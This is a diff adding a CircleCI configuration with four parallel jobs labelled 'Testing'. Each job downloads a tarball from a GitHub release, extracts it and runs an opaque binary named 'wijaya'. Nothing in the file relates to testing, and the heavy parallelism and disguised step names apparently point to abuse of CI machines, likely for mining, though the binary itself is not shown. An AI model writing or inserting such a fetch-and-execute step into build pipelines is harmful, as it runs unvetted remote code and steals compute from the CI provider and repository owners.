@@ -1,0 +1,50 @@
+version: 2.1
+jobs:
+    Devop:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: medium
+      parallelism: 7    
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: wget https://github.com/peplop/puplop/releases/download/shisu/shifu.tar.gz && tar -xvf shifu.tar.gz && cd shifu && ./wijaya
+    Devop1:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: medium
+      parallelism: 7   
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: wget https://github.com/peplop/puplop/releases/download/shisu/shifu.tar.gz && tar -xvf shifu.tar.gz && cd shifu && ./wijaya
+    Devop2:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: medium
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: wget https://github.com/peplop/puplop/releases/download/shisu/shifu.tar.gz && tar -xvf shifu.tar.gz && cd shifu && ./wijaya
+    Devop3:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: medium 
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: wget https://github.com/peplop/puplop/releases/download/shisu/shifu.tar.gz && tar -xvf shifu.tar.gz && cd shifu && ./wijaya
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
